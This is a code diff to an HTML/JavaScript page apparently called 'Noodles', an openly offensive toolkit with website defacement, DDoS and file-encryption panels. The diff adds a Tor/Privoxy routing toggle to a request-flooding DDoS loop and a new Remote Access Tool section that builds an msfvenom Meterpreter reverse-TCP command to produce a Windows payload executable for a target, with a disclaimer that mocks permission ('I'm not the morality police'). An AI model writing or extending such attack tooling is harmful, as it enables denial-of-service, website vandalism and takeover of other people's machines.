@@ -7,8 +7,8 @@
      <style>
          body {
              font-family: monospace;
-             background-color: #1a1a1a; /* Darker background */
-             color: #a3a3a3; /* Lighter text */
+             background-color: #1a1a1a;
+             color: #a3a3a3;
              margin: 0;
              padding: 0;
              overflow: hidden;
@@ -42,29 +42,29 @@
              max-width: 800px;
              margin: 20px auto;
              padding: 20px;
-             background-color: rgba(26, 26, 26, 0.8); /* Dark container */
-             border: 1px solid #4d4d4d; /* Darker border */
-             box-shadow: 0 0 10px #4d4d4d; /* Darker shadow */
+             background-color: rgba(26, 26, 26, 0.8);
+             border: 1px solid #4d4d4d;
+             box-shadow: 0 0 10px #4d4d4d;
          }
  
 
          h1, h2 {
-             color: #800080; /* Purple */
+             color: #800080;
              text-align: center;
          }
  
 
          section {
              margin-bottom: 20px;
-             border: 1px solid #4d4d4d; /* Darker border */
+             border: 1px solid #4d4d4d;
              padding: 10px;
          }
  
 
-         button, input[type="text"], input[type="file"], textarea {
-             background-color: #4d4d4d; /* Darker input fields */
-             color: #a3a3a3; /* Lighter text */
-             border: 1px solid #800080; /* Purple border */
+         button, input[type="text"], input[type="file"], input[type="number"], textarea {
+             background-color: #4d4d4d;
+             color: #a3a3a3;
+             border: 1px solid #800080;
              padding: 5px 10px;
              margin: 5px;
              cursor: pointer;
@@ -73,14 +73,14 @@
  
 
          button:hover {
-             background-color: #00008b; /* Dark blue */
-             color: #fff; /* White text */
+             background-color: #00008b;
+             color: #fff;
          }
  
 
          #defacement-preview {
-             background-color: #333; /* Darker preview background */
-             color: #a3a3a3; /* Lighter text */
+             background-color: #333;
+             color: #a3a3a3;
              border: 1px solid #4d4d4d;
              min-height: 100px;
              overflow: auto;
@@ -88,7 +88,7 @@
  
 
          .warning {
-             color: #ffcc00; /* Slightly different yellow */
+             color: #ffcc00;
              font-weight: bold;
          }
  
@@ -105,8 +105,8 @@
              left: 0;
              width: 200px;
              height: 100%;
-             background-color: rgba(26, 26, 26, 0.9); /* Dark sidebar */
-             border-right: 1px solid #4d4d4d; /* Darker border */
+             background-color: rgba(26, 26, 26, 0.9);
+             border-right: 1px solid #4d4d4d;
              z-index: 3;
              padding-top: 20px;
          }
@@ -123,14 +123,14 @@
              padding: 10px;
              text-align: center;
              cursor: pointer;
-             border-bottom: 1px solid #4d4d4d; /* Darker border */
+             border-bottom: 1px solid #4d4d4d;
              transition: background-color 0.3s, color 0.3s;
          }
  
 
          .sidebar li:hover {
-             background-color: #00008b; /* Dark blue */
-             color: #fff; /* White text */
+             background-color: #00008b;
+             color: #fff;
          }
  
 
@@ -161,22 +161,22 @@
              width: 100%;
              height: 100%;
              overflow: auto;
-             background-color: rgba(26, 26, 26, 0.8); /* Dark modal background */
+             background-color: rgba(26, 26, 26, 0.8);
          }
  
 
          .modal-content {
-             background-color: #4d4d4d; /* Darker modal content background */
+             background-color: #4d4d4d;
              margin: 15% auto;
              padding: 20px;
-             border: 1px solid #800080; /* Purple border */
+             border: 1px solid #800080;
              width: 80%;
-             color: #a3a3a3; /* Lighter text */
+             color: #a3a3a3;
          }
  
 
          .close {
-             color: #800080; /* Purple close button */
+             color: #800080;
              float: right;
              font-size: 28px;
              font-weight: bold;
@@ -186,7 +186,7 @@
 
          .close:hover,
          .close:focus {
-             color: #fff; /* White text */
+             color: #fff;
              text-decoration: none;
              cursor: pointer;
          }
@@ -226,26 +226,24 @@
          }
  
 
-         /* Additional Styling for Smoothness */
          .content, .sidebar {
              transition: margin-left 0.5s ease;
          }
  
 
-         /* New Styles for Dark Blue/Red Scheme */
          h1, h2 {
-             color: #dc143c; /* Dark Red */
+             color: #dc143c;
          }
  
 
          button:hover {
-             background-color: #191970; /* Midnight Blue */
+             background-color: #191970;
              color: #fff;
          }
  
 
          .sidebar li:hover {
-             background-color: #191970; /* Midnight Blue */
+             background-color: #191970;
              color: #fff;
          }
  
@@ -254,13 +252,12 @@
          input[type="number"],
          input[type="file"],
          textarea {
-             background-color: #333; /* Dark Gray */
+             background-color: #333;
              color: #fff;
              border: 1px solid #4d4d4d;
          }
  
 
-         /* Custom Scrollbar */
          ::-webkit-scrollbar {
              width: 8px;
          }
@@ -281,6 +278,49 @@
          }
  
 
+         /* Tor Button Style */
+         .tor-button {
+             background-color: #4d4d4d;
+             color: #a3a3a3;
+             border: 1px solid #800080;
+             padding: 5px 10px;
+             margin: 5px;
+             cursor: pointer;
+             transition: background-color 0.3s, color 0.3s;
+         }
+ 
+
+         .tor-button:hover {
+             background-color: #00008b;
+             color: #fff;
+         }
+ 
+
+         /* Dark Mode Toggle Style */
+         .dark-mode-toggle {
+             position: fixed;
+             top: 20px;
+             right: 20px;
+             z-index: 6;
+         }
+ 
+
+         .dark-mode-toggle button {
+             background-color: #4d4d4d;
+             color: #a3a3a3;
+             border: 1px solid #800080;
+             padding: 5px 10px;
+             cursor: pointer;
+             transition: background-color 0.3s, color 0.3s;
+         }
+ 
+
+         .dark-mode-toggle button:hover {
+             background-color: #00008b;
+             color: #fff;
+         }
+ 
+
      </style>
  </head>
  <body>
@@ -298,6 +338,7 @@
          <li onclick="showSection('ddos')">DDoS Tool</li>
          <li onclick="showSection('encryption')">File Encryption Tool</li>
          <li onclick="showSection('reporting')">Reporting</li>
+         <li onclick="showSection('remote')">Remote Access Tool</li>
      </ul>
  </div>
  
@@ -330,6 +371,13 @@
              <button onclick="startDDoS()">Start DDoS</button>
              <button onclick="stopDDoS()">Stop DDoS</button>
              <p>Time Running: <span id="ddos-timer">0</span> seconds</p>
+ 
+
+             <!-- Tor Integration -->
+             <button class="tor-button" onclick="toggleTorProxy()">Toggle Tor Proxy</button>
+             <span id="tor-status">Tor Proxy: OFF</span>
+ 
+
              <input type="checkbox" id="ddos-onion" name="ddos-onion">
              <label for="ddos-onion">Target is .onion?</label>
          </section>
@@ -351,6 +399,17 @@
          <section id="reporting" style="display: none;">
              <h2>Reporting Tool</h2>
              <p>Document findings and vulnerabilities. (Feature to be implemented later, maybe...)</p>
+         </section>
+ 
+
+         <!-- Remote Access Tool (RAT) -->
+         <section id="remote" style="display: none;">
+             <h2>Remote Access Tool (RAT)</h2>
+             <p>Gain remote control over a target machine. Use responsibly... or exploit the fuck out of it. <a href="#" onclick="openModal('remote-info')">Learn more</a></p>
+             <input type="text" id="rat-ip" placeholder="Target IP Address">
+             <input type="number" id="rat-port" placeholder="Port">
+             <button onclick="generatePayload()">Generate Payload</button>
+             <p>Payload Instructions: <span id="payload-instructions"></span></p>
          </section>
  
 
@@ -414,6 +473,23 @@
  </div>
  
 
+ <div id="remote-info" class="modal">
+     <div class="modal-content">
+         <span class="close" onclick="closeModal('remote-info')">&times;</span>
+         <h2>Remote Access Tool (RAT) Information</h2>
+         <p>The Remote Access Tool (RAT) allows you to gain control over a target machine remotely. This tool can be used for legitimate purposes such as remote administration or technical support, but it can also be misused for malicious activities like data theft or system compromise. </p>
+         <h3>How it Works:</h3>
+         <ul>
+             <li><b>Target IP Address:</b> Enter the IP address of the target machine.</li>
+             <li><b>Port:</b> Specify the port to use for the remote connection.</li>
+             <li><b>Generate Payload:</b> Create a malicious payload (executable file) that needs to be executed on the target machine.</li>
+             <li><b>Payload Instructions:</b> Instructions on how to deploy and execute the payload on the target machine.</li>
+         </ul>
+         <p><b>Disclaimer:</b> Misuse of this tool can lead to severe legal consequences. Use responsibly and only on machines you own or have explicit permission to access... or don't, I'm not the morality police.</p>
+     </div>
+ </div>
+ 
+
  <div class="log-container">
      <h2>Log</h2>
      <ul id="log">
@@ -421,8 +497,14 @@
  </div>
  
 
+ <div class="dark-mode-toggle">
+     <button onclick="toggleDarkMode()">Toggle Dark Mode</button>
+ </div>
+ 
+
  <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+ <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
      console.log("Noodles Initialized");
  
@@ -433,18 +515,7 @@
  
 
      function setSecurityHeaders() {
-         // Secure Headers
          console.warn("Security Headers need server-side config.");
-         // This needs to be configured on the server, not in the client-side code.
-         // Example (for Node.js with Express):
-         // app.use((req, res, next) => {
-         //   res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
-         //   res.setHeader('X-Frame-Options', 'DENY');
-         //   res.setHeader('X-Content-Type-Options', 'nosniff');
-         //   res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
-         //   res.setHeader('Permissions-Policy', 'geolocation=(), microphone=()');
-         //   next();
-         // });
      }
      setSecurityHeaders();
  
@@ -459,13 +530,20 @@
  
 
      function showSection(sectionId) {
-         const sections = ['defacement', 'ddos', 'encryption', 'reporting'];
+         const sections = ['defacement', 'ddos', 'encryption', 'reporting', 'remote'];
          sections.forEach(id => {
              document.getElementById(id).style.display = 'none';
          });
          document.getElementById(sectionId).style.display = 'block';
          console.log(`Showing section: ${sectionId}`);
          logAction(`Showing section: ${sectionId}`);
+     }
+ 
+
+     // Dark Mode Function
+     function toggleDarkMode() {
+         const body = document.body;
+         body.classList.toggle('dark-mode');
      }
  
 
@@ -480,7 +558,6 @@
          logAction(`Backing up website: ${url}`);
  
 
-         // Fetch the website content and create a downloadable backup file
          fetch(url, {
              method: 'GET',
              mode: 'cors',
@@ -534,7 +611,6 @@
          logAction(`Attempting to deface: ${url} with code.`);
  
 
-         // Attempt to modify the website directly (this will likely be blocked by CORS in most browsers)
          fetch(url, {
              method: 'GET',
              mode: 'cors',
@@ -581,12 +657,23 @@
      let ddosInterval;
      let ddosStartTime;
      let isDDoSRunning = false;
+     let useTorProxy = false;
+ 
+
+     function toggleTorProxy() {
+         useTorProxy = !useTorProxy;
+         document.getElementById('tor-status').textContent = `Tor Proxy: ${useTorProxy ? 'ON' : 'OFF'}`;
+         console.log(`Tor Proxy toggled ${useTorProxy ? 'ON' : 'OFF'}`);
+         logAction(`Tor Proxy toggled ${useTorProxy ? 'ON' : 'OFF'}`);
+     }
  
 
      function startDDoS() {
          const url = document.getElementById('ddos-url').value;
          const threads = parseInt(document.getElementById('ddos-threads').value) || 1;
          const isOnion = document.getElementById('ddos-onion').checked;
+ 
+
          if (!url) {
              alert("Please enter a URL.");
              return;
@@ -608,21 +695,31 @@
              for (let i = 0; i < threads; i++) {
                  let targetUrl = url;
                  if (isOnion) {
-                     // Tor proxy setup (replace with your Tor proxy - ensure Tor is running)
-                     targetUrl = 'http://127.0.0.1:9050/' + url;  // Ensure Tor is running and using port 9050
+                     targetUrl = 'http://127.0.0.1:9050/' + url;
                  } else {
-                     // Using a CORS proxy (but note this is not suitable for real DDoS)
                      targetUrl = 'https://corsproxy.io/?' + encodeURIComponent(url);
                  }
-                 fetch(targetUrl, { mode: 'no-cors' })
-                     .then(() => {
+ 
+
+                 // Use Tor Proxy if enabled
+                 if (useTorProxy) {
+                     targetUrl = 'http://127.0.0.1:8118/' + url;  //Default Privoxy Tor port
+                 }
+ 
+
+                 $.ajax({
+                     url: targetUrl,
+                     type: 'GET',
+                     mode: 'no-cors',
+                     success: function() {
                          console.log(`DDoS: Sent request to ${url}`);
                          logAction(`DDoS: Sent request to ${url}`);
-                     })
-                     .catch(error => {
+                     },
+                     error: function(error) {
                          console.error(`DDoS: Error sending request`, error);
                          logAction(`DDoS: Error sending request ${error}`);
-                     });
+                     }
+                 });
              }
          }, 0);
  
@@ -718,6 +815,26 @@
              document.getElementById('decryption-instructions').textContent = `To decrypt, use the same key (${key}) and Noodles File Encryption Tool.`;
          };
          reader.readAsArrayBuffer(file);
+     }
+ 
+
+     // Remote Access Tool (RAT)
+     function generatePayload() {
+         const ipAddress = document.getElementById('rat-ip').value;
+         const port = document.getElementById('rat-port').value;
+ 
+
+         if (!ipAddress || !port) {
+             alert("Enter target IP address and port.");
+             return;
+         }
+ 
+
+         // Generate a malicious payload (this is a simplified example and may not work in real-world scenarios)
+         const payload = `msfvenom -p windows/meterpreter/reverse_tcp LHOST=${ipAddress} LPORT=${port} -f exe -o payload.exe`;
+         document.getElementById('payload-instructions').textContent = `Run this command on your system: ${payload}`;
+         console.warn(`Payload generated: ${payload}`);
+         logAction(`Payload generated: ${payload}`);
      }
  
 
